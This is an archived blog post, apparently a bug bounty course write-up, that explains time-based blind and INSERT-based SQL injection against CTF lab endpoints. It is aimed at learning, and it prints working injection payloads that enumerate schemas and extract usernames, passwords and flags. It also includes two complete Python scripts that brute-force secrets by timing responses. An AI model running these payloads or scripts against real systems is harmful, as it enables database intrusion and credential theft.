# Advanced SQL Injection (Part 2)

- **Source URL:** https://medium.com/@julius.grosserode.19/advanced-sql-injection-part-2-57bf83e202b1?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250804072953/https://medium.com/@julius.grosserode.19/advanced-sql-injection-part-2-57bf83e202b1
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/9030 (id 9030)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# SQL Injection Part 2

*This is part of my NahamSec bug bounty course series. Summary + Solutions for all Sections.*

In this second part we are going to learn about Blind Based , Insert Error Based and Insert Blind Based sqli. We are also gonna have a loot at a real sqli bug bounty report.

Our first lab is blind based sqli. Its called this way because you cant see if your sql payloads are beeing executed or not. At least not directly. Here is what you can do anyway:

In our example we have a signup field where you can enter your email for a newsletter. Your email is then beeing sent to `https://ctfio.com/?email=` . And thats about all you know…

Now to find out if this endpoint is vurnable you can use another sql command called SLEEP(x) wich, as you might have guessed, waits for x seconds. Enter this *email*:

`' or 1 = SLEEP(2);--`
If you send this you will notice that the response pops up only after about 2 seconds. So in this case the endpoint is vurnable.

For the next step we need to reactivate [some knowledge we learned in PART 1.](/@julius.grosserode.19/sql-injection-97a239647ac7)

`' or 1=(select SLEEP(2) from information_schema.SCHEMATA where SCHEMA_NAME LIKE 's%');--`
1. First we escape the context (‘)
2. after a **or** we do an comparison wich always fails because 1 is never equal to the SLEEP(2) command.
3. we select SLEEP(2) from the information\_schmea database from the SCHEMATA table. This holds meta information about the db.
4. The SCHEMA\_NAME column holds the names of all db’s in the system.
5. We check if there is a database starting with the letter s.
6. If we find it the SLEEP(2) will be *selected,* meaning it will be executed. If there were none the result would be returned instantly.
7. As a result we can see that s is indeed the start of one database’s name.
8. We can enumerate the whole name of all db’s in the system like this and will eventauly find a db called `sqli_four` .

This is sometimes also called time based sqli.

Next we do the same for the TABLE\_NAME colum from information\_schema.TABLES wich holds, you guessed it …, the name of all tables. Also lets focus on our new found sqli\_four db here:

`' or 1=(SELECT SLEEP(3) FROM information_schema.TABLES WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME like 'u%' LIMIT 1 );--`
Like this you will out that there is a table called *users*. Lets find the columns in this table:

`' or 1=(SELECT SLEEP(3) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'u%' LIMIT 1 );--`
Like this we can find that there are the columns called username and password. Lastly we ofcourse want the actualy entry. First a username:

`' or 1=(select SLEEP(2) from users where username LIKE 'b%');--`
and then bens password:

`' or 1=(select SLEEP(2) from users where username = 'ben' and password LIKE 'd%');--`
If you read [part 1](/@julius.grosserode.19/sql-injection-97a239647ac7) you may notice that this is a perfect job for the python script we wrote in the sub articel. [If you havent read it yet take a look.](/@julius.grosserode.19/brute-forcing-blind-sqli-with-python-fb7bd29767cb)

We will only need to modify the code slightly to also brutforce time based sqli. We will use the time module to check how much time a request took. If it took longer than 1.5 seconds its a matching caracter.

```
import time
TIME_THRESHOLD = 1.5
def test_password(prefix):
    """Send a request and check if response time indicates a match."""
    payload = f"' or 1=(select SLEEP(2) from users where username = 'ben' and password LIKE '{prefix}%');--"
    
    start_time = time.time()
    response = requests.get(URL + payload)
    elapsed_time = time.time() - start_time
    
    return elapsed_time > TIME_THRESHOLD
```
The rest pretty much stays the same. Here is the whole script:

```
import requests
import string
import time
# Target endpoint
# URL = "https://15fc8244.eu2.ctfio.com/?email=" # CHANGE TARTGET URL!
# Character set: lowercase letters
# CHARSET = "abcdefghijklmnopqrstuvwxyz"
CHARSET = string.ascii_letters + string.digits + "{}"
# Sleep time threshold (should be slightly higher than SLEEP value)
TIME_THRESHOLD = 1.5  # Slightly above 2 seconds to detect a delay
def test_password(prefix):
    """Send a request and check if response time indicates a match."""
    payload = f"test@test.com' or 1=(select SLEEP(2) from users where username = 'ben' and password LIKE '{prefix}%');--"
    
    start_time = time.time()
    response = requests.get(URL + payload)
    elapsed_time = time.time() - start_time
    return elapsed_time > TIME_THRESHOLD  # If response time > 1.5s, the prefix is correct
def brute_force_password():
    """Extract the password character by character."""
    password = ""
    while True:
        found = False
        for char in CHARSET:
            test_prefix = password + char
            print(f"[*] Testing: {test_prefix}")
            if test_password(test_prefix):
                password += char
                print(f"[+] Found: {password}")
                found = True
                break  # Move to the next character
        
        if not found:
            print(f"[!] Password fully extracted: {password}")
            break
    return password
# Start the attack
brute_force_password()
```
In a few seconds the script tell us bens password: `dfwf32e`

To get the flag you only have to modify the payload:

`payload = f"' or 1=(select SLEEP(2) from flag where flag LIKE '{prefix}%');--"`
# Insert Error Based

In the first part i already hinted at the fact that instead of **SELECT** we can also use other Methods. One of them is **INSERT** wich adds data to the db.

In this lab we have a forum were we can leave a comment. When we submit the comment the backend secretly executes this SQL query:

`insert into comments (date,title,comment) values ('1741714087','my title','my comment')`
Now the first task is to insert the title and comment only using the title field. This can be done by entering `title','comment');--` into the title.

Next there is another special function we could try to call from our comment: `title',version());--` . The resulting comment is:

*8.0.36–0ubuntu0.22.04.1*


The version of the server running.

The next one gets a bit harder. We use a select subquery inside the insert query to find out wich db’s exsists:

`title',(SELECT GROUP_CONCAT(DISTINCT TABLE_SCHEMA) FROM information_schema.tables));--`
Lets break it down:

1. The entire subquery (select…) will be inserted into the comment field.
2. the subquery uses `GROUP_CONCAT` to put all results in one place
3. We use `DISTINCT` to avoid dublicates.
4. We search for all db names `(TABLE_SCHEMA)` inside *information\_schema.tables*

**Result**: There is a db called `sqli_five` .

Next check the tables inside:

`title',(SELECT GROUP_CONCAT(DISTINCT TABLE_NAME) FROM information_schema.tables where TABLE_SCHEMA = 'sqli_five'));--`
**Result:** There are three tables: `comments, flag, users` .

Now the name of the columns from information\_schema.columns:

`title',(SELECT GROUP_CONCAT(DISTINCT COLUMN_NAME) FROM information_schema.columns where TABLE_SCHEMA = 'sqli_five' and TABLE_NAME = 'users'));--`
**Result:** There are three columns: `id, password, username` .

Last but not least we want some real data ofcourse:

`title',(SELECT GROUP_CONCAT(concat(id,':',username,':',password),'<br>') FROM sqli_five.users));--`
We use GROUP\_CONCAT to Concatenates multiple rows into a single string and concat to combine multiple string into one. The `<br>` is a linebreak.

## Solutions

To find the flag just leave this comment:

`title', (select flag from flag));--`
# Insert Blind Based

For our last sql lab we are going blind again. This time we have a feedback form with name, email and message. The secret sauce looks like this.

`insert into comments (date,name,email,message) values ('1741717489','name','email','message')`
Since were blind we will have to work with the sleep() function again:

`name', sleep(3), 'msg');--`
Now we have name:*name*, email:sleep(3) and message equals to *msg.* When we submit our generous feedback we will have to wait 3 seconds before we get a response. A clear sign that the app is vurnable.

Next we want to find out the `version()` but were still blind so were back to using the LIKE operator and guessing.

`',( select sleep(2) where version() like '8.%' ) ,'');--`
If you keep on checking you will eventually find the whole version. Here is a last statement how to verify it:

`',( select sleep(5) where version() = '8.0.36-0ubuntu0.22.04.1' ),'');--`
## Solutions

Lets hunt for the last flag!

Again instead of enumerating by hand were gonna write our own python script to automate the job.

First capture the POST request from the form. Since this time the data is transfared in the request body we will have to simulate the request with the header. Normaly you would need to include all headers. Here it works without the most of them.

```
import requests
import time
import string
URL = "https://guo45gn4.eu2.ctfio.com/"
HEADERS = {
    "Host": "guo45gn4.eu2.ctfio.com",
    "User-Agent": "Chrome"
}
CHARSET = "flag{}" + string.ascii_letters + string.digits
FLAG = ""
DELAY_THRESHOLD = 1.0  # Sekunden, um Zeitverzögerung zu erkennen
```
Lets send the request and check the time it took. If its longer than 1 seconds we have a match.

```
def test_char(prefix, char):
    payload = f"',(select sleep(1) from flag where flag like '{prefix + char}%'), '');-- "
    data = {"name": payload, "email": "", "message": ""}
    start_time = time.time()
    requests.post(URL, headers=HEADERS, data=data)
    return (time.time() - start_time) >= DELAY_THRESHOLD
```
Finally we will use a while loop to enumerate the flag.

```
while True:
    found = False
    for char in CHARSET:
        print(f"Testing: {FLAG + char}", end="\r")
        if test_char(FLAG, char):
            FLAG += char
            print(f"[+] Found character: {char} -> Current flag: {FLAG}")
            found = True
            break
    if not found:
        break  # Kein weiteres Zeichen gefunden, Abbruch
print(f"[+] Final Flag: {FLAG}")
```
Mine found the flag in about 27 seconds.

## Bug Bounty Report

Actually in the NahamSec Course this video is missing for some strange reason. (Even tho the Hub exsists). I already contacted him. In the mean time you can check out this video by [Bug Bounty Reports Explained](https://www.youtube.com/@BugBountyReportsExplained).

Thanks for reading. Next up are Upload Vulnerabilities.
